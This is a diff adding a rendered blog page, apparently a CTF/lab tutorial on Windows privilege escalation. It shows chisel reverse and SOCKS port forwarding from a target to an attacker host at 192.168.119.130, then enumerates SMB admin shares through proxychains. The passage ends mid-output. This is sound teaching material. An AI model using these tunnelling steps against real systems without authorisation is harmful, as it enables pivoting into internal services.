@@ -1,0 +1,530 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Windows Local Privilege Escalation - Port Forwarding for CTF Creators - pwnlog</title><meta name="Description" content="Windows Local Privilege Escalation - Port Forwarding"><meta property="og:url" content="//localhost:1313/windows-privesc-port-forwarding/">
+  <meta property="og:site_name" content="pwnlog">
+  <meta property="og:title" content="Windows Local Privilege Escalation - Port Forwarding for CTF Creators">
+  <meta property="og:description" content="Windows Local Privilege Escalation - Port Forwarding">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2022-03-20T11:33:00+08:00">
+    <meta property="article:modified_time" content="2022-03-20T11:33:00+08:00">
+    <meta property="article:tag" content="Port Forwarding">
+    <meta property="article:tag" content="Remote Port Forwarding">
+    <meta property="article:tag" content="Dynamic Port Forwarding">
+    <meta property="article:tag" content="Proxychains">
+    <meta property="article:tag" content="Chisel">
+    <meta property="article:tag" content="Local Privilege Escalation">
+    <meta property="og:image" content="//localhost:1313/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="//localhost:1313/logo.png">
+  <meta name="twitter:title" content="Windows Local Privilege Escalation - Port Forwarding for CTF Creators">
+  <meta name="twitter:description" content="Windows Local Privilege Escalation - Port Forwarding">
+<meta name="application-name" content="pwnlog">
+<meta name="apple-mobile-web-app-title" content="pwnlog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="//localhost:1313/windows-privesc-port-forwarding/" /><link rel="prev" href="//localhost:1313/windows-privesc-registry/" /><link rel="next" href="//localhost:1313/windows-privesc-path-hijacking/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Windows Local Privilege Escalation - Port Forwarding for CTF Creators",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/\/localhost:1313\/windows-privesc-port-forwarding\/"
+        },"image": ["\/\/localhost:1313\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "port forwarding, remote port forwarding, dynamic port forwarding, proxychains, chisel, local privilege escalation, windows","wordcount":  1353 ,
+        "url": "\/\/localhost:1313\/windows-privesc-port-forwarding\/","datePublished": "2022-03-20T11:33:00+08:00","dateModified": "2022-03-20T11:33:00+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": "\/\/localhost:1313\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "pwnlog"
+            },"description": "Windows Local Privilege Escalation - Port Forwarding"
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="pwnlog"><span class="header-title-pre">@</span>pwnlog<span class="header-title-post">:</span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/"> ~/ </a><a class="menu-item" href="/posts/"> ~/posts </a><a class="menu-item" href="/tags/"> ~/tags </a><a class="menu-item" href="/categories/"> ~/categories </a><a class="menu-item" href="/about/"> ~/about </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="pwnlog"><span class="header-title-pre">@</span>pwnlog<span class="header-title-post">:</span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/" title="">~/</a><a class="menu-item" href="/posts/" title="">~/posts</a><a class="menu-item" href="/tags/" title="">~/tags</a><a class="menu-item" href="/categories/" title="">~/categories</a><a class="menu-item" href="/about/" title="">~/about</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Windows Local Privilege Escalation - Port Forwarding for CTF Creators</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>pwnlog</a></span>&nbsp;<span class="post-category">included in <a href="/categories/windows-local-privilege-escalation/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Windows Local Privilege Escalation</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-03-20">2022-03-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1353 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;7 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#port-forwarding">Port Forwarding</a>
+      <ul>
+        <li><a href="#port-configuration">Port Configuration</a></li>
+        <li><a href="#remote-port-forwarding">Remote Port Forwarding</a></li>
+        <li><a href="#dynamic-port-forwarding">Dynamic Port Forwarding</a></li>
+      </ul>
+    </li>
+    <li><a href="#defense">Defense</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="port-forwarding">Port Forwarding</h1>
+<p>When a service is running exclusively on an internal port or localhost (127.0.0.1), it is necessary to forward that port to our system to enumerate the service running on that specific socket. There are three primary techniques to achieve this:</p>
+<ul>
+<li><strong>Local Port Forwarding</strong></li>
+<li><strong>Remote Port Forwarding</strong></li>
+<li><strong>Dynamic Port Forwarding</strong></li>
+</ul>
+<h2 id="port-configuration">Port Configuration</h2>
+<p>Open a PowerShell or a Command Prompt console as Administrator to activate the <a href="" rel="">Windows Advanced Firewall</a> for all the profiles (nope):</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span> <span class="n">netsh</span> <span class="n">advfirewall</span> <span class="nb">set </span><span class="n">allprofiles</span> <span class="n">state</span> <span class="n">on</span>
+</span></span><span class="line"><span class="cl"><span class="n">Ok</span><span class="p">.</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="remote-port-forwarding">Remote Port Forwarding</h2>
+<p>Remote Port Forwarding means forwarding the port that&rsquo;s listening on the target host loopback interface to our host. This is done by connecting to our host <strong>from</strong> the target host.</p>
+<p>Simplified:</p>
+<ul>
+<li>Remote: Connect to ythe attacker host from the target host.</li>
+</ul>
+<p>This technique involves forwarding the port that&rsquo;s listening on the loopback interface in the target/victim host to our remote host. Startup by adding the executable permissions to the chisel binary in Linux and setup a listener:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ chmod +x chisel_1.7.7_linux_amd64
+</span></span><span class="line"><span class="cl">❯ ./chisel_1.7.7_linux_amd64 server -p <span class="m">9191</span> --reverse
+</span></span><span class="line"><span class="cl">2022/03/07 13:49:57 server: Reverse tunnelling enabled
+</span></span><span class="line"><span class="cl">2022/03/07 13:49:57 server: Fingerprint 0ToKrAu+HqrbE9RCpmLwj5XanRN3Lg9QJ/SaFH8Is5k<span class="o">=</span>
+</span></span><span class="line"><span class="cl">2022/03/07 13:49:57 server: Listening on http://0.0.0.0:9191
+</span></span><span class="line"><span class="cl">2022/03/07 13:50:14 server: session#1: tun: proxy#R:445<span class="o">=</span>&gt;445: Listening
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now in Windows execute the following to forward port 445 to the attacker (Linux) host:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span> <span class="p">.\</span><span class="n">chisel</span><span class="p">.</span><span class="py">exe</span> <span class="n">client</span> <span class="mf">192.168</span><span class="p">.</span><span class="py">119</span><span class="p">.</span><span class="mf">130</span><span class="err">:</span><span class="mf">9191</span> <span class="n">R:</span><span class="mf">445</span><span class="err">:</span><span class="mf">127.0</span><span class="p">.</span><span class="py">0</span><span class="p">.</span><span class="mf">1</span><span class="err">:</span><span class="mf">445</span>
+</span></span><span class="line"><span class="cl"><span class="mf">2022</span><span class="p">/</span><span class="mf">03</span><span class="p">/</span><span class="mf">07</span> <span class="mf">14</span><span class="err">:</span><span class="mf">50</span><span class="err">:</span><span class="mf">14</span> <span class="n">client</span><span class="err">:</span> <span class="n">Connecting</span> <span class="n">to</span> <span class="n">ws</span><span class="err">:</span><span class="p">//</span><span class="mf">192.168</span><span class="p">.</span><span class="py">119</span><span class="p">.</span><span class="mf">130</span><span class="err">:</span><span class="mf">9191</span>
+</span></span><span class="line"><span class="cl"><span class="mf">2022</span><span class="p">/</span><span class="mf">03</span><span class="p">/</span><span class="mf">07</span> <span class="mf">14</span><span class="err">:</span><span class="mf">50</span><span class="err">:</span><span class="mf">14</span> <span class="n">client</span><span class="err">:</span> <span class="n">Connected</span> <span class="p">(</span><span class="n">Latency</span> <span class="mf">688</span><span class="p">.</span><span class="n">5µs</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The syntax of the command above is the following:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">chisel</span> <span class="n">client</span> <span class="p">&lt;</span><span class="n">CLIENT_IP</span><span class="p">&gt;</span><span class="err">:</span><span class="p">&lt;</span><span class="n">PORT_TO_CONNECT</span><span class="p">/</span><span class="n">YOUR_CHISEL_SERVER_PORT</span><span class="p">&gt;</span> <span class="n">R:</span><span class="p">&lt;</span><span class="n">PORT_TO_FORWARD_FROM_VICTIM</span><span class="p">&gt;</span><span class="err">:</span><span class="p">&lt;</span><span class="n">TUNNEL_TARGET_IP</span><span class="p">&gt;</span><span class="err">:</span><span class="p">&lt;</span><span class="n">PORT_TO_FORWARD_TO_CLIENT</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>Note: The letter R: means that it&rsquo;ll perform a reverse port forward.</p>
+</blockquote>
+<p>Now we have access to the SMB share from our host:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ smbclient -U Administrator -L //127.0.0.1
+</span></span><span class="line"><span class="cl">Enter WORKGROUP<span class="se">\A</span>dministrator<span class="err">&#39;</span>s password:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	Sharename       Type      Comment
+</span></span><span class="line"><span class="cl">	---------       ----      -------
+</span></span><span class="line"><span class="cl">	ADMIN$          Disk      Remote Admin
+</span></span><span class="line"><span class="cl">	C$              Disk      Default share
+</span></span><span class="line"><span class="cl">	IPC$            IPC       Remote IPC
+</span></span><span class="line"><span class="cl">Reconnecting with SMB1 <span class="k">for</span> workgroup listing.
+</span></span><span class="line"><span class="cl">do_connect: Connection to 127.0.0.1 failed <span class="o">(</span>Error NT_STATUS_CONNECTION_REFUSED<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Unable to connect with SMB1 -- no workgroup available
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>If kill the connection by sending an exit signal, i.e, Ctrl+C. We can see that we can no longer connect:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ smbclient -U Administrator -L //127.0.0.1
+</span></span><span class="line"><span class="cl">do_connect: Connection to 127.0.0.1 failed <span class="o">(</span>Error NT_STATUS_CONNECTION_REFUSED<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="dynamic-port-forwarding">Dynamic Port Forwarding</h2>
+<p>Dynamic Port Forwarding means forwarding every port that&rsquo;s listening on the target host loopback interface to our host via our SOCKS port.</p>
+<ul>
+<li>Dynamic: Forward all the ports from the remote host to our SOCKS port.</li>
+</ul>
+<p>SOCKS works on the OSI Layer 5 (Session Layer), so don&rsquo;t expect things like ICMP, ARP or the half-open reset that SYN scan on nmap to work. In order to scan via proxy with nmap we need to do a TCP connect scan with the option <code>-sT</code> and we should ignore ICMP with <code>-Pn</code>.</p>
+<p>There are different tools to help you out when Dynamic port forwarding is being used. The most common one is <code>proxychains</code> which is available for Linux and Mac but also for Windows. Dynamic port forwarding allows you to create a socket on the local client machine, which acts as a SOCKS proxy server. When a client connects to this port, the connection is forwarded to the remote machine, which is then forwarded to a dynamic port on the destination machine. This way, all the applications using the SOCKS proxy will connect to the service, and the server will forward all the traffic to its actual destination.</p>
+<p>Install the proxychains package:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo apt install proxychains
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Alternatively, you can build it from the <a href="https://github.com/haad/proxychains" target="_blank" rel="noopener noreffer ">source code</a> from github.</p>
+<p>Let&rsquo;s configure the proxychains:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo vim /etc/proxychains.conf
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Leave the following SOCKS5 configuration:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ tail -n <span class="m">2</span> /etc/proxychains.conf
+</span></span><span class="line"><span class="cl">socks5 	127.0.0.1 <span class="m">1080</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now on the attacker (Linux) host:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ ./chisel_1.7.7_linux_amd64 server -p <span class="m">9292</span> --reverse
+</span></span><span class="line"><span class="cl">2022/03/07 14:12:03 server: Reverse tunnelling enabled
+</span></span><span class="line"><span class="cl">2022/03/07 14:12:03 server: Fingerprint oswwvQ0i0qhUScfY0AJZQPzhG3TVLMaF5mFonQ/6IJQ<span class="o">=</span>
+</span></span><span class="line"><span class="cl">2022/03/07 14:12:03 server: Listening on http://0.0.0.0:9292
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Alternatively, we could the following flag:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">./chisel_1.7.7_linux_amd64 server -p <span class="m">9292</span> --socks5 --reverse
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Then in Windows connect to our SOCKS5 proxy:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span> <span class="p">.\</span><span class="n">chisel</span><span class="p">.</span><span class="py">exe</span> <span class="n">client</span> <span class="mf">192.168</span><span class="p">.</span><span class="py">119</span><span class="p">.</span><span class="mf">130</span><span class="err">:</span><span class="mf">9292</span> <span class="n">R:socks</span>
+</span></span><span class="line"><span class="cl"><span class="mf">2022</span><span class="p">/</span><span class="mf">03</span><span class="p">/</span><span class="mf">07</span> <span class="mf">15</span><span class="err">:</span><span class="mf">13</span><span class="err">:</span><span class="mf">36</span> <span class="n">client</span><span class="err">:</span> <span class="n">Connecting</span> <span class="n">to</span> <span class="n">ws</span><span class="err">:</span><span class="p">//</span><span class="mf">192.168</span><span class="p">.</span><span class="py">119</span><span class="p">.</span><span class="mf">130</span><span class="err">:</span><span class="mf">9292</span>
+</span></span><span class="line"><span class="cl"><span class="mf">2022</span><span class="p">/</span><span class="mf">03</span><span class="p">/</span><span class="mf">07</span> <span class="mf">15</span><span class="err">:</span><span class="mf">13</span><span class="err">:</span><span class="mf">36</span> <span class="n">client</span><span class="err">:</span> <span class="n">Connected</span> <span class="p">(</span><span class="n">Latency</span> <span class="mf">1</span><span class="p">.</span><span class="n">4047ms</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Alternatively, if we want to specify a SOCKS5 port we can do the following:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.\</span><span class="n">chisel</span><span class="p">.</span><span class="py">exe</span> <span class="n">client</span> <span class="mf">192.168</span><span class="p">.</span><span class="py">119</span><span class="p">.</span><span class="mf">130</span><span class="err">:</span><span class="mf">9292</span> <span class="n">R:</span><span class="mf">5000</span><span class="err">:</span><span class="n">socks</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>In our chisel output from the attacker host, we can see that a session was created on port 1080:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">2022/03/07 14:13:36 server: session#1: tun: proxy#R:127.0.0.1:1080<span class="o">=</span>&gt;socks: Listening
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can use <code>ss</code> to dup our socket statistics:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ ss -tnlp
+</span></span><span class="line"><span class="cl">State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    Process
+</span></span><span class="line"><span class="cl">LISTEN    <span class="m">0</span>         <span class="m">4096</span>             127.0.0.1:1080             0.0.0.0:*        users:<span class="o">((</span><span class="s2">&#34;chisel_1.7.7_li&#34;</span>,pid<span class="o">=</span>125026,fd<span class="o">=</span>8<span class="o">))</span>
+</span></span><span class="line"><span class="cl">LISTEN    <span class="m">0</span>         <span class="m">4096</span>                     *:9292                   *:*        users:<span class="o">((</span><span class="s2">&#34;chisel_1.7.7_li&#34;</span>,pid<span class="o">=</span>125026,fd<span class="o">=</span>6<span class="o">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We have port 1080 listening on localhost (127.0.0.1) as we can see from the nmap scan:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ sudo proxychains nmap -p <span class="m">445</span> localhost -Pn -sT
+</span></span><span class="line"><span class="cl"><span class="o">[</span>proxychains<span class="o">]</span> config file found: /etc/proxychains.conf
+</span></span><span class="line"><span class="cl"><span class="o">[</span>proxychains<span class="o">]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+</span></span><span class="line"><span class="cl"><span class="o">[</span>proxychains<span class="o">]</span> DLL init: proxychains-ng 4.15
+</span></span><span class="line"><span class="cl">Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-03-07 14:41 EST
+</span></span><span class="line"><span class="cl"><span class="o">[</span>proxychains<span class="o">]</span> Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:445  ...  OK
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> localhost <span class="o">(</span>127.0.0.1<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.0052s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT    STATE SERVICE
+</span></span><span class="line"><span class="cl">445/tcp open  microsoft-ds
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 0.05 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Noticed how I used the options:</p>
+<ul>
+<li>-sT = TCP connect scan, rather than the default <code>-sS</code> SYN scan. The SYN won’t work because the proxy doesn&rsquo;t pass the TCP handshake packets back to the attacker host, a SYN scan, which sends the SYN packet, sees the ACK and then ends the connection, this won’t be passed back over the proxy, therefore, SYN scans don&rsquo;t work with proxies.</li>
+<li>-Pn = Ignore ICMP request/response because ICMP doesn&rsquo;t go through the proxy.</li>
+</ul>
+<p>Without these options the scan will fail because the proxy will drop any SYN scans, we need the full TCP handshake to know if the port is open or not.</p>
+<p>The key to the output above is in this line:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>proxychains<span class="o">]</span> Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:445  ...  OK
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Notice how it goes through the SOCKS5 proxy port and from there it goes to port 445.</p>
+<p>Let&rsquo;s try to authenticate to SMB:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ sudo proxychains smbclient -U Administrator -L //127.0.0.1
+</span></span><span class="line"><span class="cl"><span class="o">[</span>proxychains<span class="o">]</span> config file found: /etc/proxychains.conf
+</span></span><span class="line"><span class="cl"><span class="o">[</span>proxychains<span class="o">]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+</span></span><span class="line"><span class="cl"><span class="o">[</span>proxychains<span class="o">]</span> DLL init: proxychains-ng 4.15
+</span></span><span class="line"><span class="cl"><span class="o">[</span>proxychains<span class="o">]</span> Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:445  ...  OK
+</span></span><span class="line"><span class="cl">Enter WORKGROUP<span class="se">\A</span>dministrator<span class="err">&#39;</span>s password:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	Sharename       Type      Comment
+</span></span><span class="line"><span class="cl">	---------       ----      -------
+</span></span><span class="line"><span class="cl">	ADMIN$          Disk      Remote Admin
+</span></span><span class="line"><span class="cl">	C$              Disk      Default share
+</span></span><span class="line"><span class="cl">	IPC$            IPC       Remote IPC
